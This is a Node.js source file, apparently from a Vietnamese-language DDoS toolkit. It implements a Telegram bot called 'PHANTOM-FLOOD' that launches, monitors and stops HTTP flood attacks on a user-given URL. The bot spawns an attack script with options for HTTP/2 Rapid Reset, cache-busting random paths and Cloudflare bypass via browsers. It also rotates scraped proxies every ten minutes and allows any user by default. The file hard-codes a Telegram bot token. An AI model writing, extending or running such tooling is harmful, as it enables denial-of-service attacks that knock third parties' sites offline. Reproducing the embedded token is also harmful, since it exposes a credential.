const TelegramBot = require("node-telegram-bot-api");
const { spawn } = require("child_process");
const path = require("path");
const fs = require("fs");
const os = require("os");

// ==================== CẤU HÌNH ====================
const BOT_TOKEN =
  process.env.BOT_TOKEN || "7983734590:AAGoDuaSDiIQ5zaDuP1XhoCd3upAnS1UNsE"; // Đọc từ env hoặc dùng mặc định
const ALLOWED_USERS = []; // Thêm Telegram User ID được phép sử dụng, để trống = cho phép tất cả
const PROXY_FILE = "proxy.txt"; // File proxy mặc định
// =====================================================

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const activeAttacks = new Map(); // Lưu trữ các cuộc tấn công đang chạy

// Kiểm tra quyền truy cập
function isAllowed(userId) {
  if (ALLOWED_USERS.length === 0) return true;
  return ALLOWED_USERS.includes(userId);
}

// Format thời gian
function formatDuration(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}h ${m}m ${s}s`;
}

// Lệnh /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  if (!isAllowed(msg.from.id)) {
    return bot.sendMessage(chatId, "⛔ Bạn không có quyền sử dụng bot này.");
  }

  const welcomeMessage = `
🔥 *PHANTOM-FLOOD BOT* 🔥
💀 Telegram Control Panel 💀

*Các lệnh có sẵn:*

/flood - Bắt đầu tấn công
/stop - Dừng tấn công đang chạy
/status - Xem trạng thái các cuộc tấn công
/proxy - Xem danh sách proxy
/getproxy - Lấy proxy mới
/help - Xem hướng dẫn chi tiết

📌 *Ví dụ nhanh:*
\`/flood https://target.com 120 10 90\`
`;

  bot.sendMessage(chatId, welcomeMessage, { parse_mode: "Markdown" });
});

// Lệnh /help
bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;

  if (!isAllowed(msg.from.id)) {
    return bot.sendMessage(chatId, "⛔ Bạn không có quyền sử dụng bot này.");
  }

  const helpMessage = `
📖 *HƯỚNG DẪN SỬ DỤNG*

*Cú pháp:*
\`/flood <target> <time> <threads> <ratelimit> [options]\`

*Tham số bắt buộc:*
• \`target\` - URL mục tiêu (https://...)
• \`time\` - Thời gian tấn công (giây)
• \`threads\` - Số luồng (khuyến nghị: 5-20)
• \`ratelimit\` - Giới hạn request/giây

*Tham số tùy chọn:*
• \`--proxy <file>\` - File proxy (mặc định: proxy.txt)
• \`--debug\` - Chế độ debug chi tiết
• \`--reset\` - Bật chế độ Rapid Reset (mạnh hơn)
• \`--randpath\` - Random paths để bypass cache
• \`--close\` - Đóng socket khi gặp 429
• \`--browser <N>\` - Max concurrent browsers (Cloudflare bypass)

*Ví dụ:*
\`\`\`
/flood https://target.com 120 10 90
/flood https://target.com 120 10 90 --reset --debug
/flood https://target.com 120 10 90 --browser 5 --randpath
\`\`\`
`;

  bot.sendMessage(chatId, helpMessage, { parse_mode: "Markdown" });
});

// Lệnh /flood
bot.onText(/\/flood(.*)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isAllowed(userId)) {
    return bot.sendMessage(chatId, "⛔ Bạn không có quyền sử dụng bot này.");
  }

  const argsString = match[1].trim();

  if (!argsString) {
    return bot.sendMessage(
      chatId,
      `
❌ *Thiếu tham số!*

*Cú pháp:* \`/flood <target> <time> <threads> <ratelimit> [options]\`

*Ví dụ:* \`/flood https://target.com 120 10 90\`

Gõ /help để xem hướng dẫn chi tiết.
`,
      { parse_mode: "Markdown" },
    );
  }

  // Parse arguments
  const args = parseArgs(argsString);

  if (args.length < 4) {
    return bot.sendMessage(
      chatId,
      `
❌ *Thiếu tham số!*

Cần ít nhất 4 tham số: target, time, threads, ratelimit

*Ví dụ:* \`/flood https://target.com 120 10 90\`
`,
      { parse_mode: "Markdown" },
    );
  }

  const target = args[0];
  const time = parseInt(args[1]);
  const threads = parseInt(args[2]);
  const ratelimit = parseInt(args[3]);
  const options = args.slice(4);

  // Validate
  if (!target.startsWith("https://")) {
    return bot.sendMessage(chatId, "❌ Target phải bắt đầu bằng `https://`", {
      parse_mode: "Markdown",
    });
  }

  if (isNaN(time) || time < 1 || time > 900000) {
    return bot.sendMessage(chatId, "❌ Thời gian phải từ 1-900000 giây");
  }

  if (isNaN(threads) || threads < 1 || threads > 100) {
    return bot.sendMessage(chatId, "❌ Threads phải từ 1-100");
  }

  if (isNaN(ratelimit) || ratelimit < 1) {
    return bot.sendMessage(chatId, "❌ Ratelimit phải >= 1");
  }

  // Tìm proxy file trong options hoặc dùng mặc định
  let proxyFile = PROXY_FILE;
  const proxyIndex = options.indexOf("--proxy");
  if (proxyIndex !== -1 && options[proxyIndex + 1]) {
    proxyFile = options[proxyIndex + 1];
    options.splice(proxyIndex, 2); // Xóa --proxy và value
  }

  // Kiểm tra proxy file tồn tại
  const proxyPath = path.join(__dirname, proxyFile);
  if (!fs.existsSync(proxyPath)) {
    return bot.sendMessage(
      chatId,
      `❌ Không tìm thấy file proxy: \`${proxyFile}\``,
      { parse_mode: "Markdown" },
    );
  }

  // Build command
  const phantomPath = path.join(__dirname, "script.js");
  const cmdArgs = [
    phantomPath,
    target,
    time.toString(),
    threads.toString(),
    ratelimit.toString(),
    proxyFile,
    ...options,
  ];

  // Gửi thông báo bắt đầu
  const startMessage = `
🚀 *BẮT ĐẦU TẤN CÔNG*

🎯 *Target:* \`${target}\`
⏱ *Thời gian:* ${formatDuration(time)}
🔀 *Threads:* ${threads}
📊 *Rate:* ${ratelimit} req/s
📁 *Proxy:* ${proxyFile}
${options.length > 0 ? `⚙️ *Options:* ${options.join(" ")}` : ""}

💀 Đang khởi động script.js...
`;

  bot.sendMessage(chatId, startMessage, { parse_mode: "Markdown" });

  // Spawn process với detached để có thể kill cả process group
  const child = spawn("node", cmdArgs, {
    cwd: __dirname,
    stdio: ["ignore", "pipe", "pipe"],
    detached: true,
    env: { ...process.env, FORCE_COLOR: "0" },
  });

  const attackId = `${chatId}_${Date.now()}`;

  activeAttacks.set(attackId, {
    process: child,
    target,
    startTime: Date.now(),
    duration: time,
    chatId,
    userId,
  });

  let outputBuffer = "";
  let lastSentTime = 0;
  let statusMessageId = null;

  // Capture stdout
  child.stdout.on("data", (data) => {
    outputBuffer += data.toString();
  });

  // Interval để cập nhật output mỗi 5 giây (tránh spam và cập nhật đúng yêu cầu)
  const outputInterval = setInterval(async () => {
    const now = Date.now();
    if (outputBuffer.trim() && now - lastSentTime >= 5000) {
      const lines = outputBuffer.split("\n").filter((l) => l.trim());
      if (lines.length > 0) {
        const lastLines = lines.slice(-20).join("\n");
        const formattedMsg = `📤 *Output (Cập nhật 5s):*\n\`\`\`\n${lastLines.slice(-3500)}\n\`\`\``;

        try {
          if (!statusMessageId) {
            // Lần đầu gởi message mới
            const sentMsg = await bot.sendMessage(chatId, formattedMsg, {
              parse_mode: "Markdown",
            });
            statusMessageId = sentMsg.message_id;
          } else {
            // Các lần sau chỉ cập nhật message cũ
            await bot.editMessageText(formattedMsg, {
              chat_id: chatId,
              message_id: statusMessageId,
              parse_mode: "Markdown",
            });
          }
        } catch (e) {
          // Nếu edit lỗi (do message quá cũ hoặc bị xóa), gửi cái mới
          try {
            const sentMsg = await bot.sendMessage(chatId, formattedMsg, {
              parse_mode: "Markdown",
            });
            statusMessageId = sentMsg.message_id;
          } catch (err) {}
        }
        lastSentTime = now;
        // Giữ lại buffer một chút để người dùng xem tiếp, hoặc clear tùy ý
        // Ở đây ta clear để chỉ hiện output mới nhất trong 5s qua
        outputBuffer = "";
      }
    }
  }, 5000);

  // Capture stderr (Merge vào output để không bị spam message)
  child.stderr.on("data", (data) => {
    outputBuffer += data.toString();
  });

  // Process exit - cleanup tài nguyên
  child.on("close", (code) => {
    clearInterval(outputInterval);
    activeAttacks.delete(attackId);
    outputBuffer = "";

    // Force garbage collection nếu có
    if (global.gc) {
      try {
        global.gc();
      } catch (e) {}
    }

    const endMessage =
      code === 0 || code === null
        ? `✅ *TẤN CÔNG HOÀN TẤT*\n\n🎯 Target: \`${target}\``
        : `❌ *TẤN CÔNG KẾT THÚC*\n\nExit code: ${code}`;

    bot
      .sendMessage(chatId, endMessage, { parse_mode: "Markdown" })
      .catch(() => {});
  });

  child.on("error", (err) => {
    activeAttacks.delete(attackId);
    bot
      .sendMessage(chatId, `❌ *Lỗi khởi động:*\n\`${err.message}\``, {
        parse_mode: "Markdown",
      })
      .catch(() => {});
  });

  // Auto stop sau thời gian duration + buffer
  setTimeout(
    () => {
      if (activeAttacks.has(attackId)) {
        const attack = activeAttacks.get(attackId);
        if (attack && attack.process && attack.process.pid) {
          // Gửi SIGINT để script.js có cơ hội cleanup browsers
          try {
            process.kill(-attack.process.pid, "SIGINT");
          } catch (e) {
            try {
              attack.process.kill("SIGINT");
            } catch (e) {}
          }
        }
        activeAttacks.delete(attackId);
      }
    },
    (time + 10) * 1000,
  );
});

// Lệnh /stop
bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isAllowed(userId)) {
    return bot.sendMessage(chatId, "⛔ Bạn không có quyền sử dụng bot này.");
  }

  let stoppedCount = 0;

  for (const [attackId, attack] of activeAttacks) {
    if (attack.chatId === chatId || attack.userId === userId) {
      try {
        const pid = attack.process.pid;
        if (pid) {
          // Gửi SIGINT để cleanup trước
          try {
            process.kill(-pid, "SIGINT");
          } catch (e) {
            // Fallback
            attack.process.kill("SIGINT");
          }
        }
        activeAttacks.delete(attackId);
        stoppedCount++;
      } catch (e) {
        // Vẫn xóa khỏi map nếu có lỗi
        activeAttacks.delete(attackId);
      }
    }
  }

  if (stoppedCount > 0) {
    bot.sendMessage(chatId, `🛑 Đã dừng ${stoppedCount} cuộc tấn công.`);
  } else {
    bot.sendMessage(chatId, "ℹ️ Không có cuộc tấn công nào đang chạy.");
  }
});

// Lệnh /status
bot.onText(/\/status/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isAllowed(userId)) {
    return bot.sendMessage(chatId, "⛔ Bạn không có quyền sử dụng bot này.");
  }

  const userAttacks = [];

  for (const [attackId, attack] of activeAttacks) {
    if (attack.chatId === chatId || attack.userId === userId) {
      const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
      const remaining = Math.max(0, attack.duration - elapsed);

      userAttacks.push({
        target: attack.target,
        elapsed: formatDuration(elapsed),
        remaining: formatDuration(remaining),
      });
    }
  }

  if (userAttacks.length === 0) {
    return bot.sendMessage(
      chatId,
      `
ℹ️ *Không có cuộc tấn công nào đang chạy.*

🖥 *System Info:*
CPU Load: ${os
        .loadavg()
        .map((l) => l.toFixed(2))
        .join(", ")}
RAM Usage: ${((1 - os.freemem() / os.totalmem()) * 100).toFixed(1)}% (${(
        (os.totalmem() - os.freemem()) /
        1024 /
        1024 /
        1024
      ).toFixed(2)}GB / ${(os.totalmem() / 1024 / 1024 / 1024).toFixed(2)}GB)
`,
      { parse_mode: "Markdown" },
    );
  }

  let statusMessage = "📊 *TRẠNG THÁI TẤN CÔNG*\n\n";

  // Add System Info
  statusMessage += `🖥 *System Info:*\n`;
  statusMessage += `CPU Load: \`${os
    .loadavg()
    .map((l) => l.toFixed(2))
    .join(", ")}\`\n`;
  statusMessage += `RAM: \`${((1 - os.freemem() / os.totalmem()) * 100).toFixed(
    1,
  )}%\` (${((os.totalmem() - os.freemem()) / 1024 / 1024 / 1024).toFixed(2)}GB / ${(
    os.totalmem() /
    1024 /
    1024 /
    1024
  ).toFixed(2)}GB)\n\n`;
  statusMessage += `--------------------------------\n\n`;

  userAttacks.forEach((attack, index) => {
    statusMessage += `*${index + 1}.* \`${attack.target}\`\n`;
    statusMessage += `   ⏱ Đã chạy: ${attack.elapsed}\n`;
    statusMessage += `   ⏳ Còn lại: ${attack.remaining}\n\n`;
  });

  bot.sendMessage(chatId, statusMessage, { parse_mode: "Markdown" });
});

// Lệnh /proxy - Xem danh sách proxy
bot.onText(/\/proxy/, (msg) => {
  const chatId = msg.chat.id;
  if (!isAllowed(msg.from.id))
    return bot.sendMessage(chatId, "⛔ Không có quyền.");

  const proxyPath = path.join(__dirname, PROXY_FILE);
  if (!fs.existsSync(proxyPath))
    return bot.sendMessage(chatId, "❌ File proxy chưa tồn tại.");

  fs.readFile(proxyPath, "utf8", (err, data) => {
    if (err) return bot.sendMessage(chatId, "❌ Lỗi đọc file proxy.");
    const lines = data.split("\n").filter((l) => l.trim());
    const count = lines.length;
    const preview = lines.slice(0, 15).join("\n");
    bot.sendMessage(
      chatId,
      `📁 *Proxy List*\n📊 Tổng: ${count}\n\nXem trước (15 dòng):\n\`\`\`\n${preview}\n\`\`\``,
      { parse_mode: "Markdown" },
    );
  });
});

// Lệnh /getproxy - Ép cập nhật proxy mới
bot.onText(/\/getproxy/, (msg) => {
  const chatId = msg.chat.id;
  if (!isAllowed(msg.from.id))
    return bot.sendMessage(chatId, "⛔ Không có quyền.");

  bot.sendMessage(chatId, "🔄 Đang chạy tool lấy proxy...");
  const proxyScript = path.join(__dirname, "proxy.js");

  const child = spawn("node", [proxyScript], { cwd: __dirname });

  let stderr = "";
  child.stderr.on("data", (d) => (stderr += d));

  child.on("close", (code) => {
    if (code === 0) {
      // Đọc lại file để báo số lượng
      const proxyPath = path.join(__dirname, PROXY_FILE);
      if (fs.existsSync(proxyPath)) {
        const count = fs
          .readFileSync(proxyPath, "utf8")
          .split("\n")
          .filter((l) => l.trim()).length;
        bot.sendMessage(
          chatId,
          `✅ Đã lấy proxy xong! Tổng hiện tại: ${count}`,
        );
      } else {
        bot.sendMessage(chatId, "✅ Đã chạy xong nhưng không thấy file proxy.");
      }
    } else {
      bot.sendMessage(
        chatId,
        `❌ Lỗi khi lấy proxy. Exit code: ${code}\nStderr: ${stderr.slice(0, 200)}`,
      );
    }
  });

  child.on("error", (err) => {
    bot.sendMessage(chatId, `❌ Lỗi thực thi: ${err.message}`);
  });
});

// Parse arguments với hỗ trợ quotes
function parseArgs(str) {
  const args = [];
  let current = "";
  let inQuotes = false;
  let quoteChar = "";

  for (let i = 0; i < str.length; i++) {
    const char = str[i];

    if ((char === '"' || char === "'") && !inQuotes) {
      inQuotes = true;
      quoteChar = char;
    } else if (char === quoteChar && inQuotes) {
      inQuotes = false;
      quoteChar = "";
    } else if (char === " " && !inQuotes) {
      if (current.trim()) {
        args.push(current.trim());
      }
      current = "";
    } else {
      current += char;
    }
  }

  if (current.trim()) {
    args.push(current.trim());
  }

  return args;
}

// Xử lý lỗi polling
bot.on("polling_error", (error) => {
  console.error("Polling error:", error.code);
});

// Tự động chạy proxy scraper mỗi 30 phút
function startProxyScraper() {
  const proxyScript = path.join(__dirname, "proxy.js");
  const runScraper = () => {
    console.log("[SYSTEM] Đang cập nhật proxy list (Background)...");
    const child = spawn("node", [proxyScript, "--silent"], {
      cwd: __dirname,
      detached: true,
      stdio: "ignore",
    });
    child.unref();
  };

  // Chạy ngay lập tức khi khởi động
  runScraper();

  // Chạy định kỳ mỗi 10 phút
  setInterval(runScraper, 10 * 60 * 1000);
}

startProxyScraper();

console.log("🤖 Telegram Bot đã khởi động!");
console.log("📌 Sử dụng /start để bắt đầu");
